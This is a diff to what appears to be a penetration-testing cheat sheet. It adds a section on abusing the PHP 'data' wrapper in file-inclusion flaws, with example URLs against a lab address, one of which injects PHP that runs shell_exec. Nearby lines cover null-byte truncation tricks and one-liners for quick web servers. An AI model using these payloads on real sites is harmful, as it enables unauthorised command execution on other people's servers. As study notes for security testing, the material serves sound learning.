@@ -722,6 +722,15 @@ File inclusion tricks:
 - Older versions of PHP have a vulnerability in which a null byte278 (%00) will terminate any string. This trick can be used to bypass file extensions added server-side and is useful for file inclusions because it prevents the file extension from being considered as part of the string. 
 - End the file extension with a them with a question mark (?) to mark anything added to the URL server-side as part of the query string.
 
+#### "data" PHP wrapper handy for file inclusion
+These are to pass the content of the "file" as part of the URL itself.
+```
+http://10.11.0.22/menu.php?file=data:text/plain,hello world
+```
+```
+http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+```
+
 ### Web server one-liners
 ```
 python -m SimpleHTTPServer 7331]
@@ -730,3 +739,4 @@ php -S 0.0.0.0:8000
 ruby -run -e httpd . -p 9000
 busybox httpd -f -p 10000
 ```
+
